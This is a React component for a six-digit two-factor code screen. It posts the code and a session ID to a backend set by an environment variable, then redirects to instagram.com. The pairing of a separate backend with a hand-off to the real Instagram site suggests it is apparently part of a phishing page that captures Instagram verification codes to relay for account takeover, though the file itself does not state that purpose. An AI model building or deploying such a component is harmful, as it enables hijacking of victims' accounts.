import React, { useState } from "react";
import { Lock } from "lucide-react";
import { Input } from "../ui/input.js";
import { Button } from "../ui/button.js";
import { Card, CardContent } from "../ui/card.js";

const TwoFactorVerification = ({ message, sessionId }) => {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 6) {
      setCode(value);
      setError(""); // Clear error when user starts typing
    }
  };

  const handleSubmit = async (e) => {
    e?.preventDefault();

    if (code.length !== 6) {
      setError("Please enter a 6-digit code");
      return;
    }

    try {
      setIsSubmitting(true);
      setError("");

      const response = await fetch(
        `${process.env.REACT_APP_API_URL}/accounts/login/two_factor`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            sessionId,
            verificationCode: code,
          }),
          credentials: "include", // If you're using cookies
        }
      );

      const data = await response.json();

      if (response.ok) {
        // Consider handling the redirect server-side
        window.location.href = "https://www.instagram.com";
      } else {
        setError(data.message || "Verification failed. Please try again.");
      }
    } catch (err) {
      setError("Network error. Please check your connection and try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Card className="w-full max-w-md mx-auto shadow-lg">
      <CardContent className="p-6 space-y-6">
        <div className="flex justify-center">
          <div className="rounded-full border-2 border-primary p-4">
            <Lock className="w-8 h-8 text-primary" />
          </div>
        </div>

        <div className="space-y-2 text-center">
          <p className="text-lg text-muted-foreground">{message}</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <Input
            type="text"
            placeholder="Security Code"
            value={code}
            onChange={handleInputChange}
            className="text-center text-lg"
            maxLength={6}
            inputMode="numeric"
            pattern="[0-9]*"
            aria-label="Security code input"
            required
          />

          <Button
            type="submit"
            className="w-full"
            disabled={isSubmitting || code.length !== 6}
          >
            {isSubmitting ? "Verifying..." : "Confirm"}
          </Button>

          {error && (
            <p className="text-destructive text-sm text-center" role="alert">
              {error}
            </p>
          )}
        </form>
      </CardContent>
    </Card>
  );
};

export default TwoFactorVerification;
